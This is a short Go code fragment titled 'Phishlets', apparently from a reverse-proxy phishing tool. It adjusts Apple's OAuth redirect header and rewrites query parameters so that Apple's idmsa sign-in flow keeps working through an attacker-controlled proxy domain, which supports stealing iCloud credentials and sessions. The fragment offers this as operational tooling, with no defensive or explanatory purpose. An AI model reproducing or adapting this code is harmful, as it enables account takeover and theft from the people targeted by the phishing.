# Phishlets

				//Replace User Agent Header
				useragent := req.Header.Get("X-Apple-Oauth-Redirect-Uri")
				if useragent != "" {
					req.Header.Set("X-Apple-Oauth-Redirect-Uri", "https://www.icloud.com")
					log.Debug("[%d] X-Apple-Oauth-Redirect-Uri: https://www.icloud.com", ps.Index)

				} 	
        
        
        
        
				// patch GET query params with original domains
				if pl != nil {
					qs := req.URL.Query()
					if len(qs) > 0 {
						for gp := range qs {
							for i, v := range qs[gp] {
								qs[gp][i] = string(p.patchUrls(pl, []byte(v), CONVERT_TO_ORIGINAL_URLS))
							if qs[gp][i] == "/appleauthhttps://idmsa.test.com/auth" { // https://idmsa.apple.com/appleauthhttps://idmsa.test.com/auth
								qs[gp][i] = "/appleauth/auth" // https://idmsa.test.com/appleauth/auth
							}
							}
						}
						req.URL.RawQuery = qs.Encode()
					}
				} 	        
